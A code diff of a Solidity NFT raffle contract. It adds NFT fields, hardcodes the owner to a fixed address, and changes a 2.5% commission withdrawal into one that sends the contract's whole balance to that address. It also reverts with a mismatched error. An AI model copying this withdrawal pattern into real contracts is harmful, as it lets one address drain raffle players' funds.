@@ -13,22 +13,25 @@ error Raffle__CannotBuy0Slots();
 error Raffle__RaffleFull();
 error Raffle__RaffleOngoing();
 error Raffle__ContractNotHoldingNFT();
+error Raffle__ContractHoldingNFT();
 error Raffle__InsufficientTicketsLeft();
 error Raffle__InsufficientTicketsBought();
 error Raffle__RandomNumberStillLoading();
 error Raffle__WinnerAlreadySelected();
 error Raffle__OnlyNFTOwnerCanAccess();
 
-contract Raffle is ERC721, VRFV2WrapperConsumerBase {
-    //Owner
-    address payable owner; 
+abstract contract Raffle is ERC721, VRFV2WrapperConsumerBase {
+    //Contract Owner
+    address payable public owner; 
 
-    // Raffle Content
+    //Raffle Content
     address payable immutable nftOwner;
     uint256 public immutable ticketFee;
     uint256 public immutable maxTickets;
     uint256 public startTime;
     uint256 public endTime;
+    address public immutable nftContract;
+    uint256 public immutable nftID;
     bool holdingNFT;
 
     //Chainlink Content
@@ -46,12 +49,15 @@ contract Raffle is ERC721, VRFV2WrapperConsumerBase {
     event RaffleRefunded(address indexed player, uint256 numRefunded);
     event RaffleWinner(address indexed winner);
 
-    constructor(uint256 _ticketFee, uint256 _maxTickets, uint256 _startTime, uint256 _endTime) {
+    constructor(uint256 _ticketFee, uint256 _maxTickets, uint256 _startTime, uint256 _endTime, address _nftContract, uint256 _nftID) {
+        owner = payable(address(0x8B603f2890694cF31689dFDA28Ff5e79917243e9));
         nftOwner = payable(msg.sender);
         ticketFee = _ticketFee;
         maxTickets = _maxTickets;
         startTime = _startTime;
         endTime = _endTime;
+        nftContract = _nftContract;
+        nftID = _nftID;
     }
 
     modifier onlynftOwner() {
@@ -158,8 +164,11 @@ contract Raffle is ERC721, VRFV2WrapperConsumerBase {
 
     //receiving nft function w/ vrfCalled mod
 
-    function withdrawCommission() external onlyOwner {
-        payable(owner).transfer((address(this).balance * 25)/1000);
+    function ownerCommission() external onlyOwner { 
+        if(holdingNFT == true) {
+            revert Raffle__ContractNotHoldingNFT();
+        }
+        payable(owner).transfer((address(this).balance));
     }
 
     function reappointOwner(address payable _newOwner) external onlyOwner {
@@ -169,4 +178,7 @@ contract Raffle is ERC721, VRFV2WrapperConsumerBase {
 
         owner = _newOwner;
     }
+
+    
+    
 }
